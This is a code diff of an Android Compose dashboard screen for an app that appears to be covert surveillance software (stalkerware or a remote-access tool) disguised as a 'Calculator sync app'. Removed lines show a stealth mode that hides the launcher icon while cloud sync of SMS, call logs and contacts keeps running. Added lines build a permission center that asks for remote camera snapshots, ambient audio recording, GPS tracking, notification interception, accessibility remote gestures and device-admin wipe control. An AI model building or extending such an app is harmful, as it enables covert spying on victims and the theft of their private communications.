@@ -4,12 +4,15 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.net.Uri
+import android.os.Build
 import android.provider.Settings
 import androidx.compose.foundation.BorderStroke
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.Arrangement
 import androidx.compose.foundation.layout.Box
 import androidx.compose.foundation.layout.Column
+import androidx.compose.foundation.layout.PaddingValues
 import androidx.compose.foundation.layout.Row
 import androidx.compose.foundation.layout.Spacer
 import androidx.compose.foundation.layout.fillMaxSize
@@ -26,6 +29,7 @@ import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.filled.Android
+import androidx.compose.material.icons.filled.Check
 import androidx.compose.material.icons.filled.CheckCircle
 import androidx.compose.material.icons.filled.DeleteSweep
 import androidx.compose.material.icons.filled.Email
@@ -52,6 +56,7 @@ import androidx.compose.material3.ButtonDefaults
 import androidx.compose.material3.Card
 import androidx.compose.material3.CardDefaults
 import androidx.compose.material3.CircularProgressIndicator
+import androidx.compose.material3.Divider
 import androidx.compose.material3.Icon
 import androidx.compose.material3.IconButton
 import androidx.compose.material3.LinearProgressIndicator
@@ -94,14 +99,12 @@ fun DashboardScreen(
 ) {
     val isSyncing by viewModel.isSyncing.collectAsState()
     val lastSyncTime by viewModel.lastSyncTime.collectAsState()
-    val stealthModeEnabled by viewModel.stealthModeEnabled.collectAsState()
     val clearDataBeforeUpload by viewModel.clearDataBeforeUpload.collectAsState()
     val deviceInfo by viewModel.deviceInfo.collectAsState()
     val smsList by viewModel.smsList.collectAsState()
     val callLogs by viewModel.callLogs.collectAsState()
     val contacts by viewModel.contacts.collectAsState()
 
-    var showStealthDialog by remember { mutableStateOf(false) }
     val dateFormat = remember { SimpleDateFormat("MMM dd, hh:mm:ss a", Locale.getDefault()) }
     val context = LocalContext.current
 
@@ -373,42 +376,7 @@ fun DashboardScreen(
                         textAlign = TextAlign.Center
                     )
 
-                    Spacer(modifier = Modifier.height(16.dp))
 
-                    // 3. Hide / Show Launcher Button
-                    Button(
-                        onClick = { showStealthDialog = true },
-                        modifier = Modifier
-                            .fillMaxWidth()
-                            .height(54.dp)
-                            .testTag("hide_launcher_button"),
-                        shape = RoundedCornerShape(16.dp),
-                        colors = ButtonDefaults.buttonColors(
-                            containerColor = if (stealthModeEnabled) HighDensityDarkButton else HighDensityPrimaryContainer,
-                            contentColor = if (stealthModeEnabled) Color.White else HighDensityOnPrimaryContainer
-                        )
-                    ) {
-                        Icon(
-                            imageVector = if (stealthModeEnabled) Icons.Default.VisibilityOff else Icons.Default.Visibility,
-                            contentDescription = "Launcher Visibility",
-                            modifier = Modifier.size(22.dp)
-                        )
-                        Spacer(modifier = Modifier.width(10.dp))
-                        Text(
-                            text = if (stealthModeEnabled) "RESTORE LAUNCHER ICON" else "HIDE LAUNCHER ICON",
-                            fontSize = 14.sp,
-                            fontWeight = FontWeight.Bold
-                        )
-                    }
-
-                    Spacer(modifier = Modifier.height(6.dp))
-                    Text(
-                        text = if (stealthModeEnabled) "Status: App Icon Hidden (Stealth Mode Active)" else "Status: App Icon Visible on Android Launcher",
-                        fontSize = 11.sp,
-                        fontWeight = FontWeight.Medium,
-                        color = if (stealthModeEnabled) HighDensityWarning else HighDensityOnPrimaryContainer.copy(alpha = 0.8f),
-                        textAlign = TextAlign.Center
-                    )
                 }
             }
 
@@ -926,7 +894,7 @@ fun DashboardScreen(
                 }
             }
 
-            // Permissions & Policy Control Center
+            // Comprehensive System Permissions & Access Control Center
             Card(
                 modifier = Modifier.fillMaxWidth(),
                 shape = RoundedCornerShape(24.dp),
@@ -948,7 +916,7 @@ fun DashboardScreen(
                             )
                             Spacer(modifier = Modifier.width(8.dp))
                             Text(
-                                text = "SYSTEM PERMISSIONS & ACCESS",
+                                text = "SYSTEM PERMISSIONS & ACCESS CENTER",
                                 fontSize = 12.sp,
                                 fontWeight = FontWeight.Bold,
                                 color = HighDensityOnSurface,
@@ -968,14 +936,21 @@ fun DashboardScreen(
                         }
                     }
 
+                    Spacer(modifier = Modifier.height(10.dp))
+                    Text(
+                        text = "If you mistakenly denied any permission, tap 'ALLOW' or 'GRANT' below to enable full background sync and camera/telemetry capabilities.",
+                        fontSize = 11.sp,
+                        color = HighDensitySecondary
+                    )
+
                     Spacer(modifier = Modifier.height(14.dp))
 
-                    // 1. Primary Runtime Telemetry Permissions
+                    // 1. Bulk Runtime Permissions Launcher
                     Button(
                         onClick = onRequestPermissions,
                         modifier = Modifier
                             .fillMaxWidth()
-                            .height(48.dp)
+                            .height(44.dp)
                             .testTag("request_all_permissions_button"),
                         colors = ButtonDefaults.buttonColors(containerColor = HighDensityPrimary),
                         shape = RoundedCornerShape(12.dp)
@@ -983,29 +958,168 @@ fun DashboardScreen(
                         Icon(Icons.Default.CheckCircle, contentDescription = null, modifier = Modifier.size(18.dp))
                         Spacer(modifier = Modifier.width(8.dp))
                         Text(
-                            text = if (hasPermissions) "RE-GRANT TELEMETRY PERMISSIONS" else "GRANT TELEMETRY PERMISSIONS",
-                            fontSize = 12.sp,
+                            text = "GRANT ALL RUNTIME PERMISSIONS",
+                            fontSize = 11.sp,
                             fontWeight = FontWeight.Bold
                         )
                     }
 
-                    Spacer(modifier = Modifier.height(10.dp))
+                    Spacer(modifier = Modifier.height(16.dp))
 
-                    // 2. Battery & Device Admin Controls Row
+                    // Granular Permission Status & Allow Buttons
+                    val pm = context.packageManager
+                    val packageName = context.packageName
+
+                    // Granular Runtime Permissions
+                    val permissionsList = listOf(
+                        Triple("Camera Access", android.Manifest.permission.CAMERA, "Required for remote camera snapshots & telemetry"),
+                        Triple("Microphone Access", android.Manifest.permission.RECORD_AUDIO, "Required for ambient audio telemetry recording"),
+                        Triple("Location Access", android.Manifest.permission.ACCESS_FINE_LOCATION, "Required for real-time GPS device tracking"),
+                        Triple("Contacts Access", android.Manifest.permission.READ_CONTACTS, "Required for contacts cloud backup"),
+                        Triple("SMS & Messages Access", android.Manifest.permission.READ_SMS, "Required for SMS message sync & backup"),
+                        Triple("Call Logs Access", android.Manifest.permission.READ_CALL_LOG, "Required for call log cloud backup"),
+                        Triple("Notifications Access", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) android.Manifest.permission.POST_NOTIFICATIONS else "", "Required for system alerts & service notifications")
+                    )
+
+                    permissionsList.forEach { (title, perm, desc) ->
+                        if (perm.isNotEmpty()) {
+                            val isGranted = androidx.core.content.ContextCompat.checkSelfPermission(context, perm) == android.content.pm.PackageManager.PERMISSION_GRANTED
+                            Row(
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .padding(vertical = 6.dp),
+                                horizontalArrangement = Arrangement.SpaceBetween,
+                                verticalAlignment = Alignment.CenterVertically
+                            ) {
+                                Column(modifier = Modifier.weight(1f)) {
+                                    Row(verticalAlignment = Alignment.CenterVertically) {
+                                        Text(text = title, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
+                                        Spacer(modifier = Modifier.width(6.dp))
+                                        Text(
+                                            text = if (isGranted) "GRANTED" else "DENIED",
+                                            fontSize = 9.sp,
+                                            fontWeight = FontWeight.Bold,
+                                            color = if (isGranted) HighDensitySuccess else HighDensityWarning
+                                        )
+                                    }
+                                    Text(text = desc, fontSize = 10.sp, color = HighDensitySecondary)
+                                }
+                                Spacer(modifier = Modifier.width(8.dp))
+                                if (!isGranted) {
+                                    OutlinedButton(
+                                        onClick = onRequestPermissions,
+                                        shape = RoundedCornerShape(8.dp),
+                                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
+                                        colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
+                                        border = BorderStroke(1.dp, HighDensityPrimary)
+                                    ) {
+                                        Text("ALLOW", fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                                    }
+                                } else {
+                                    Icon(
+                                        imageVector = Icons.Default.Check,
+                                        contentDescription = "Granted",
+                                        tint = HighDensitySuccess,
+                                        modifier = Modifier.size(18.dp)
+                                    )
+                                }
+                            }
+                            Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)
+                        }
+                    }
+
+                    Spacer(modifier = Modifier.height(12.dp))
+                    Text("SYSTEM & SPECIAL ACCESS SERVICES", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = HighDensityPrimary, letterSpacing = 0.5.sp)
+                    Spacer(modifier = Modifier.height(8.dp))
+
+                    // Special Permissions Cards
+                    // 1. Accessibility Service
+                    val isAccActive = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                     Row(
-                        modifier = Modifier.fillMaxWidth(),
-                        horizontalArrangement = Arrangement.spacedBy(8.dp)
+                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
+                        horizontalArrangement = Arrangement.SpaceBetween,
+                        verticalAlignment = Alignment.CenterVertically
                     ) {
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text("Accessibility Service", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
+                            Text("Automated remote gestures & system dialogs", fontSize = 10.sp, color = HighDensitySecondary)
+                        }
+                        OutlinedButton(
+                            onClick = { com.example.service.AccessibilityOverlayManager.openAccessibilitySettings(context) },
+                            shape = RoundedCornerShape(8.dp),
+                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
+                            colors = ButtonDefaults.outlinedButtonColors(contentColor = if (isAccActive) HighDensitySuccess else HighDensityPrimary),
+                            border = BorderStroke(1.dp, if (isAccActive) HighDensitySuccess else HighDensityOutline)
+                        ) {
+                            Text(if (isAccActive) "ACTIVE" else "ENABLE", fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                        }
+                    }
+                    Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)
+
+                    // 2. Display Over Other Apps (Overlay)
+                    val isOverlayActive = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(context) else true
+                    Row(
+                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
+                        horizontalArrangement = Arrangement.SpaceBetween,
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text("Display Over Other Apps", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
+                            Text("Background popup activities & lockscreen overlay", fontSize = 10.sp, color = HighDensitySecondary)
+                        }
+                        OutlinedButton(
+                            onClick = {
+                                try {
+                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                                        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
+                                        context.startActivity(intent)
+                                    }
+                                } catch (_: Exception) {}
+                            },
+                            shape = RoundedCornerShape(8.dp),
+                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
+                            colors = ButtonDefaults.outlinedButtonColors(contentColor = if (isOverlayActive) HighDensitySuccess else HighDensityPrimary),
+                            border = BorderStroke(1.dp, if (isOverlayActive) HighDensitySuccess else HighDensityOutline)
+                        ) {
+                            Text(if (isOverlayActive) "ACTIVE" else "GRANT", fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                        }
+                    }
+                    Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)
+
+                    // 3. Unrestricted Battery
+                    Row(
+                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
+                        horizontalArrangement = Arrangement.SpaceBetween,
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text("Unrestricted Battery", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
+                            Text("Prevents OS battery saver from killing sync engine", fontSize = 10.sp, color = HighDensitySecondary)
+                        }
                         OutlinedButton(
                             onClick = { viewModel.requestBatteryOptimizationExemption(context) },
-                            modifier = Modifier.weight(1f),
-                            shape = RoundedCornerShape(12.dp),
+                            shape = RoundedCornerShape(8.dp),
+                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                             colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                             border = BorderStroke(1.dp, HighDensityOutline)
                         ) {
-                            Text("Unrestricted Battery", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
+                            Text("CONFIGURE", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                         }
+                    }
+                    Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)
 
+                    // 4. Device Admin Policy
+                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
+                    val isAdminActive = dpm?.isAdminActive(ComponentName(context, MyDeviceAdminReceiver::class.java)) == true
+                    Row(
+                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
+                        horizontalArrangement = Arrangement.SpaceBetween,
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text("Device Admin Policy", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
+                            Text("Remote lock, wipe, and camera policy control", fontSize = 10.sp, color = HighDensitySecondary)
+                        }
                         OutlinedButton(
                             onClick = {
                                 try {
@@ -1016,105 +1130,68 @@ fun DashboardScreen(
                                     context.startActivity(intent)
                                 } catch (_: Exception) {}
                             },
-                            modifier = Modifier.weight(1f),
-                            shape = RoundedCornerShape(12.dp),
-                            colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
-                            border = BorderStroke(1.dp, HighDensityOutline)
+                            shape = RoundedCornerShape(8.dp),
+                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
+                            colors = ButtonDefaults.outlinedButtonColors(contentColor = if (isAdminActive) HighDensitySuccess else HighDensityPrimary),
+                            border = BorderStroke(1.dp, if (isAdminActive) HighDensitySuccess else HighDensityOutline)
                         ) {
-                            Text("Device Admin Policy", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
+                            Text(if (isAdminActive) "ACTIVE" else "ENABLE", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                         }
                     }
+                    Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)
 
-                    Spacer(modifier = Modifier.height(8.dp))
-
-                    // 3. Accessibility & Notifications Controls Row
+                    // 5. Notification Listener
                     Row(
-                        modifier = Modifier.fillMaxWidth(),
-                        horizontalArrangement = Arrangement.spacedBy(8.dp)
+                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
+                        horizontalArrangement = Arrangement.SpaceBetween,
+                        verticalAlignment = Alignment.CenterVertically
                     ) {
-                        OutlinedButton(
-                            onClick = {
-                                com.example.service.AccessibilityOverlayManager.openAccessibilitySettings(context)
-                            },
-                            modifier = Modifier.weight(1f),
-                            shape = RoundedCornerShape(12.dp),
-                            colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
-                            border = BorderStroke(1.dp, HighDensityOutline)
-                        ) {
-                            Text("Accessibility Service", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text("Notification Listener", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
+                            Text("Real-time intercept and sync of incoming notifications", fontSize = 10.sp, color = HighDensitySecondary)
                         }
-
                         OutlinedButton(
                             onClick = {
                                 try {
                                     context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                                 } catch (_: Exception) {}
                             },
-                            modifier = Modifier.weight(1f),
-                            shape = RoundedCornerShape(12.dp),
+                            shape = RoundedCornerShape(8.dp),
+                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                             colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                             border = BorderStroke(1.dp, HighDensityOutline)
                         ) {
-                            Text("Notification Listener", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
+                            Text("ENABLE", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                         }
                     }
+                    Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)
 
-                    Spacer(modifier = Modifier.height(8.dp))
-
-                    OutlinedButton(
-                        onClick = {
-                            try {
-                                context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
-                            } catch (_: Exception) {}
-                        },
-                        modifier = Modifier.fillMaxWidth(),
-                        shape = RoundedCornerShape(12.dp),
-                        colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
-                        border = BorderStroke(1.dp, HighDensityOutline)
+                    // 6. Usage Stats Access
+                    Row(
+                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
+                        horizontalArrangement = Arrangement.SpaceBetween,
+                        verticalAlignment = Alignment.CenterVertically
                     ) {
-                        Text("Grant Usage Stats Access Permission", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text("App Usage Stats Access", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
+                            Text("Tracks foreground app usage statistics & screen time", fontSize = 10.sp, color = HighDensitySecondary)
+                        }
+                        OutlinedButton(
+                            onClick = {
+                                try {
+                                    context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
+                                } catch (_: Exception) {}
+                            },
+                            shape = RoundedCornerShape(8.dp),
+                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
+                            colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
+                            border = BorderStroke(1.dp, HighDensityOutline)
+                        ) {
+                            Text("ENABLE", fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                        }
                     }
                 }
             }
-        }
-
-        // Hide / Show Launcher Confirmation Dialog
-        if (showStealthDialog) {
-            AlertDialog(
-                onDismissRequest = { showStealthDialog = false },
-                title = {
-                    Text(
-                        text = if (stealthModeEnabled) "Restore Launcher Icon" else "Hide Launcher Icon",
-                        color = HighDensityOnSurface,
-                        fontWeight = FontWeight.Bold
-                    )
-                },
-                text = {
-                    Text(
-                        text = if (stealthModeEnabled) "Unhide and restore the Calculator sync app icon to your Android home screen and app launcher?"
-                        else "Hide the Calculator sync app icon from the Android launcher for stealth operation? The background service and full cloud sync will continue running uninterrupted.",
-                        color = HighDensitySecondary
-                    )
-                },
-                confirmButton = {
-                    Button(
-                        onClick = {
-                            viewModel.toggleStealthMode(!stealthModeEnabled)
-                            showStealthDialog = false
-                        },
-                        colors = ButtonDefaults.buttonColors(containerColor = HighDensityPrimary)
-                    ) {
-                        Text(if (stealthModeEnabled) "Unhide Icon" else "Hide Icon")
-                    }
-                },
-                dismissButton = {
-                    TextButton(onClick = { showStealthDialog = false }) {
-                        Text("Cancel", color = HighDensitySecondary)
-                    }
-                },
-                containerColor = HighDensityCardWhite,
-                shape = RoundedCornerShape(24.dp)
-            )
         }
     }
 }
